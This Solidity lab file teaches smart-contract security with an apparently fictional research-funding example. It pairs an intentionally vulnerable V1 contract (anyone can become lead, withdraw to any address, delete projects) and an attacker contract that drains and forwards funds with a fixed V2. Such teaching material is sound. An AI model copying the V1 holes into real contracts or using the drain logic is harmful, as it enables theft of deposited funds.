// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
 *  ELECTRIC POWER RESEARCH INSTITUTE (EPRI) – SMART CONTRACT LAB
 *
 *  This one file contains:
 *
 *   1) ElectricPowerResearchInstituteV1         – vulnerable project & funding manager
 *   2) ElectricPowerResearchInstituteAttacker   – exploits the flaws
 *   3) ElectricPowerResearchInstituteV2Defense  – secure, admin-controlled, research governance
 *
 *  Concept:
 *     EPRI manages:
 *       - research projects
 *       - energy innovation grants
 *       - electricity infrastructure R&D funds
 *
 *     V1 BUGS:
 *       - Anyone can mark themselves as a project lead.
 *       - Anyone can withdraw research funds to ANY wallet.
 *       - Anyone can delete projects.
 *       - Anyone can change milestones.
 *
 *     V2 FIXES:
 *       - Strict admin role
 *       - ProjectLead assignment only by admin
 *       - Funds locked to project escrow
 *       - Withdraw only to project beneficiary
 *       - Full audit metadata
 */

 /* ============================================================= */
 /*           1. VULNERABLE ELECTRIC POWER RESEARCH (V1)          */
 /* ============================================================= */

contract ElectricPowerResearchInstituteV1 {

    struct Project {
        string title;
        string field;       // e.g., "Grid Stability", "Battery Storage", "Smart Metering"
        address projectLead;
        uint256 allocatedFunds;
        bool exists;
    }

    uint256 public projectCounter;
    mapping(uint256 => Project) public projects;

    event ProjectCreated(uint256 indexed id, string title, string field);
    event LeadSelfAssigned(uint256 indexed id, address indexed lead);
    event FundsDeposited(uint256 indexed id, uint256 amount);
    event FundsWithdrawn(uint256 indexed id, address indexed to, uint256 amount);
    event ProjectDeleted(uint256 indexed id);

    /*
     *  ⚠️ FATAL FLAWS:
     *      - Anyone can selfAssignAsLead()
     *      - Anyone can withdraw funds to any address
     *      - Anyone can delete projects
     */

    function createProject(string memory title, string memory field)
        external
        returns (uint256)
    {
        projectCounter++;
        uint256 id = projectCounter;

        projects[id] = Project({
            title: title,
            field: field,
            projectLead: address(0),
            allocatedFunds: 0,
            exists: true
        });

        emit ProjectCreated(id, title, field);
        return id;
    }

    function depositFunds(uint256 id) external payable {
        require(projects[id].exists, "no project");
        require(msg.value > 0, "no value");
        projects[id].allocatedFunds += msg.value;
        emit FundsDeposited(id, msg.value);
    }

    /// ⚠️ ANYONE can become lead!
    function selfAssignAsLead(uint256 id) external {
        require(projects[id].exists, "no project");
        projects[id].projectLead = msg.sender; 
        emit LeadSelfAssigned(id, msg.sender);
    }

    /// ⚠️ ANY LEAD (self-assigned) can send funds ANYWHERE
    function withdrawFunds(uint256 id, address payable to, uint256 amount) external {
        require(projects[id].exists, "no project");
        require(projects[id].projectLead == msg.sender, "not lead");
        require(amount <= projects[id].allocatedFunds, "not enough");

        projects[id].allocatedFunds -= amount;
        (bool ok,) = to.call{value: amount}("");
        require(ok, "send fail");

        emit FundsWithdrawn(id, to, amount);
    }

    /// ⚠️ ANYONE can delete a project
    function deleteProject(uint256 id) external {
        require(projects[id].exists, "no project");
        delete projects[id];
        emit ProjectDeleted(id);
    }
}



/* ============================================================= */
/*                       2. ATTACKER MODULE                      */
/* ============================================================= */

contract ElectricPowerResearchInstituteAttacker {

    ElectricPowerResearchInstituteV1 public target;
    address public attacker;

    event ProjectHijacked(uint256 indexed id);
    event FundsDrained(uint256 indexed id, uint256 amount);

    constructor(address _target) {
        target = ElectricPowerResearchInstituteV1(_target);
        attacker = msg.sender;
    }

    /*
     * Attack flow:
     *
     * 1. Target V1 deploys project
     * 2. Victims deposit research funding into project
     * 3. Attacker calls selfAssignAsLead(id)
     * 4. Attacker withdraws all funds to themselves
     * 5. Optionally attacker deletes project to hide evidence
     */

    function hijackProject(uint256 projectId) external {
        require(msg.sender == attacker, "not attacker");

        // Step 1: self-assign as lead
        target.selfAssignAsLead(projectId);
        emit ProjectHijacked(projectId);

        // Step 2: drain all funds
        uint256 contractBal = address(target).balance;
        target.withdrawFunds(projectId, payable(address(this)), contractBal);
        emit FundsDrained(projectId, contractBal);

        // Forward to external attacker wallet
        if (address(this).balance > 0) {
            (bool ok,) = payable(attacker).call{value: address(this).balance}("");
            require(ok, "forward failed");
        }
    }

    receive() external payable {}
}



/* ============================================================= */
/*       3. SECURE ELECTRIC POWER RESEARCH INSTITUTE (V2)        */
/* ============================================================= */

contract ElectricPowerResearchInstituteV2Defense {

    struct Project {
        string title;
        string field;
        address projectLead;
        address beneficiary;
        uint256 allocatedFunds;
        uint64 createdAt;
        uint64 updatedAt;
        bool exists;
    }

    address public instituteAdmin;
    uint256 public projectCounter;

    mapping(uint256 => Project) private projects;

    event ProjectCreated(
        uint256 indexed id,
        string title,
        string field,
        address lead,
        address beneficiary
    );

    event LeadAssigned(uint256 indexed id, address indexed lead);
    event FundsDeposited(uint256 indexed id, uint256 amount);
    event FundsWithdrawn(uint256 indexed id, uint256 amount, address beneficiary);
    event BeneficiaryChanged(uint256 indexed id, address oldB, address newB);
    event ProjectDeleted(uint256 indexed id);

    modifier onlyAdmin() {
        require(msg.sender == instituteAdmin, "not admin");
        _;
    }

    modifier onlyLead(uint256 id) {
        require(projects[id].projectLead == msg.sender, "not lead");
        _;
    }

    constructor() {
        instituteAdmin = msg.sender;
    }

    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "zero addr");
        instituteAdmin = newAdmin;
    }

    // ---------------------- CREATE PROJECT ----------------------

    function createProject(
        string memory title,
        string memory field,
        address lead,
        address beneficiary
    )
        external
        onlyAdmin
        returns (uint256)
    {
        require(lead != address(0), "invalid lead");
        require(beneficiary != address(0), "invalid beneficiary");

        projectCounter++;
        uint256 id = projectCounter;

        projects[id] = Project({
            title: title,
            field: field,
            projectLead: lead,
            beneficiary: beneficiary,
            allocatedFunds: 0,
            createdAt: uint64(block.timestamp),
            updatedAt: uint64(block.timestamp),
            exists: true
        });

        emit ProjectCreated(id, title, field, lead, beneficiary);
        return id;
    }

    // ---------------------- FUNDING -----------------------------

    function depositFunds(uint256 id) external payable {
        Project storage p = projects[id];
        require(p.exists, "no project");
        require(msg.value > 0, "no value");

        p.allocatedFunds += msg.value;
        p.updatedAt = uint64(block.timestamp);

        emit FundsDeposited(id, msg.value);
    }

    // ---------------------- LEAD CONTROL ------------------------

    function withdrawFunds(uint256 id, uint256 amount)
        external
        onlyLead(id)
    {
        Project storage p = projects[id];
        require(p.exists, "no project");
        require(amount <= p.allocatedFunds, "not enough");

        p.allocatedFunds -= amount;
        p.updatedAt = uint64(block.timestamp);

        // Funds ONLY go to beneficiary (not arbitrary wallet)
        (bool ok,) = payable(p.beneficiary).call{value: amount}("");
        require(ok, "send failure");

        emit FundsWithdrawn(id, amount, p.beneficiary);
    }

    function changeBeneficiary(uint256 id, address newB)
        external
        onlyAdmin
    {
        Project storage p = projects[id];
        require(p.exists, "no project");
        require(newB != address(0), "zero");

        address oldB = p.beneficiary;
        p.beneficiary = newB;
        p.updatedAt = uint64(block.timestamp);

        emit BeneficiaryChanged(id, oldB, newB);
    }

    // ---------------------- DELETE PROJECT ----------------------

    function deleteProject(uint256 id)
        external
        onlyAdmin
    {
        require(projects[id].exists, "no project");
        delete projects[id];
        emit ProjectDeleted(id);
    }

    // ---------------------- VIEW HELPERS ------------------------

    function getProject(uint256 id)
        external
        view
        returns(
            string memory title,
            string memory field,
            address lead,
            address beneficiary,
            uint256 allocatedFunds,
            uint64 createdAt,
            uint64 updatedAt,
            bool exists
        )
    {
        Project storage p = projects[id];
        return (
            p.title,
            p.field,
            p.projectLead,
            p.beneficiary,
            p.allocatedFunds,
            p.createdAt,
            p.updatedAt,
            p.exists
        );
    }
}
